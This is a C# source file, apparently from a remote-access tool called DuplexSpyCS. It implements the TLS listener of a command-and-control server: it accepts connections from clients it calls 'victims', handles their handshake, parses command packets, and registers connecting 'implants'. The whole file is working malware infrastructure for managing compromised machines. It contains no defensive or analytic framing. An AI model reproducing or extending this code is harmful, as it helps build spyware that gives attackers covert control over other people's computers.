using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;

namespace DuplexSpyCS
{
    public class clsTlsListener : clsListener
    {
        private X509Certificate m_certificate { get; set; }
        private TcpListener m_listener { get; set; }

        private string m_szCertFile { get; init; }
        private string m_szCertPass { get; init; }
        
        private List<clsVictim> m_lsVictim = new List<clsVictim>();
        public List<clsVictim> Victims { get { return m_lsVictim; } }

        public clsTlsListener(string szName, int nPort, string szDescription, string szCertPath, string szCertPassword)
        {
            m_szName = szName;
            m_nPort = nPort;
            m_szDescription = szDescription;
            m_protocol = enListenerProtocol.TLS;

            m_szCertFile = szCertPath;
            m_szCertPass = szCertPassword;

            if (!File.Exists(szCertPath))
                throw new Exception("Certificate file not found: " + szCertPath);

            m_certificate = new X509Certificate(szCertPath, szCertPassword);
            m_listener = new TcpListener(IPAddress.Any, nPort);

            m_bIslistening = false;
        }

        ~clsTlsListener() => fnStop();

        public override void fnStart()
        {
            if (m_bIslistening)
            {
                MessageBox.Show($"Listener[{m_szName} is already in used.", "fnStart()", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            if (string.IsNullOrEmpty(m_szCertFile))
                throw new Exception("Certificate file is null or empty.");

            if (!File.Exists(m_szCertFile))
                throw new Exception("File not found: " + m_szCertFile);

            Socket sktSrv = m_listener.Server;
            var hSafe = sktSrv.SafeHandle;
            if (sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
            {
                m_listener = null;
                m_listener = new TcpListener(IPAddress.Any, m_nPort);
            }

            m_listener.Start();
            m_listener.BeginAcceptTcpClient(new AsyncCallback(fnAcceptCallback), m_listener);
            m_bIslistening = true;

            fnOnListenerStarted(this);
        }

        public override void fnStop()
        {
            foreach (var victim in m_lsVictim)
            {
                try
                {
                    if (victim.m_sslClnt != null)
                        victim.m_sslClnt.Close();

                    if (victim.socket != null && victim.socket.Connected)
                        victim.socket.Close();
                }
                catch (Exception ex)
                {
                    clsStore.sql_conn.WriteErrorLogs(victim, ex.Message);
                }
            }

            m_lsVictim.Clear();

            if (m_listener == null)
                return;

            m_listener.Stop();
            m_bIslistening = false;

            fnOnListenerStopped(this);
        }

        private byte[] fnCombineBytes(byte[] first_bytes, int first_idx, int first_len, byte[] second_bytes, int second_idx, int second_len)
        {
            var result = new byte[first_len + second_len];

            try
            {
                Buffer.BlockCopy(first_bytes, first_idx, result, 0, first_len);
                Buffer.BlockCopy(second_bytes, second_idx, result, first_len, second_len);
            }
            catch
            {
                
            }

            return result;
        }

        private void fnAcceptCallback(IAsyncResult ar)
        {
            if (ar == null || ar.AsyncState == null)
                return;

            TcpListener listener = (TcpListener)ar.AsyncState;
            Socket sktSrv = listener.Server;

            try
            {
                var hSafe = sktSrv.SafeHandle;
                if (!m_bIslistening || sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
                    return;

                listener.BeginAcceptTcpClient(new AsyncCallback(fnAcceptCallback), listener);

                TcpClient clnt = m_listener.EndAcceptTcpClient(ar);
                SslStream sslStream = new SslStream(clnt.GetStream(), false);
                sslStream.AuthenticateAsServer(m_certificate, false, false);

                clsVictim vicitm = new clsVictim(clnt.Client, sslStream, this);

                sslStream.BeginRead(vicitm.buffer, 0, vicitm.buffer.Length, new AsyncCallback(fnReadCallback), vicitm);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void fnReadCallback(IAsyncResult ar)
        {
            if (ar?.AsyncState == null)
                return;

            clsVictim victim = (clsVictim)ar.AsyncState;

            const int CMD_TLS = 1;
            const int PARA_HELLO = 0;
            const int PARA_ACK = 1;

            try
            {
                SslStream sslClnt = victim.m_sslClnt;
                clsDSP dsp = null;

                int nRecv;
                byte[] abStaticRecvBuffer;
                byte[] abDynamicRecvBuffer = { };

                clsStore.sql_conn.WriteSystemLogs($"{victim.socket.ToString()}: Try to do TLS handshaking...");
                victim.fnSendCmdParam(1, 0);

                do
                {
                    abStaticRecvBuffer = new byte[clsVictim.MAX_BUFFER_LENGTH];
                    nRecv = sslClnt.Read(abStaticRecvBuffer, 0, abStaticRecvBuffer.Length);

                    if (nRecv <= 0)
                        break;

                    clsStore.recv_bytes += nRecv;

                    abDynamicRecvBuffer = fnCombineBytes(
                        abDynamicRecvBuffer, 0, abDynamicRecvBuffer.Length,
                        abStaticRecvBuffer, 0, nRecv);

                    //victim.fnSslSend(CMD_TLS, PARA_ACK, clsEZData.fnGenerateRandomStr());

                    while (true)
                    {
                        if (abDynamicRecvBuffer.Length < clsDSP.HEADER_SIZE)
                            break;

                        var header = clsDSP.GetHeader(abDynamicRecvBuffer);

                        if (abDynamicRecvBuffer.Length < clsDSP.HEADER_SIZE + header.len)
                            break;

                        dsp = new clsDSP(abDynamicRecvBuffer);

                        int cmd = dsp.Command;
                        int para = dsp.Param;
                        byte[] msg = dsp.GetMsg().msg;

                        abDynamicRecvBuffer = dsp.MoreData;

                        //MessageBox.Show($"{cmd},{para}");

                        if (cmd == CMD_TLS && para == PARA_HELLO)
                        {
                            victim.fnSslSend(CMD_TLS, PARA_ACK, clsEZData.fnGenerateRandomStr());
                            m_lsVictim.Add(victim);
                            clsStore.sql_conn.WriteSystemLogs($"Client online: {victim.socket.RemoteEndPoint}");
                        }
                        else if (cmd == 2)
                        {
                            if (para == 0)
                            {
                                try
                                {
                                    string szPlain = Encoding.UTF8.GetString(msg);
                                    List<string> lsMsg = szPlain.Split('|').ToList();
                                    fnReceivedDecoded(this, victim, lsMsg);
                                }
                                catch (InvalidOperationException)
                                {

                                }
                            }
                            else if (para == 1)
                            {
                                Task.Run(() =>
                                {
                                    DateTime datetime = DateTime.Now;

                                    int nDelay = 5000;
                                    Thread.Sleep(nDelay);

                                    TimeSpan span = datetime - victim.last_sent;
                                    victim.latency_time = span.Milliseconds;
                                    victim.last_sent = datetime;

                                    victim.fnSendCmdParam(2, 1);
                                });
                            }
                        }
                        else if (cmd == 3 && para == 0)
                        {
                            string szPlain = Encoding.UTF8.GetString(msg);
                            List<string> lsMsg = szPlain.Split('|').ToList();

                            fnImplantConnected(this, victim, lsMsg);
                        }
                    }
                }
                while (nRecv > 0 && m_bIslistening);
            }
            catch (Exception ex)
            {
                clsStore.sql_conn.WriteErrorLogs(victim, ex.Message);
            }
            finally
            {
                fnDisconnected(victim);
                m_lsVictim.Remove(victim);
            }
        }
    }
}
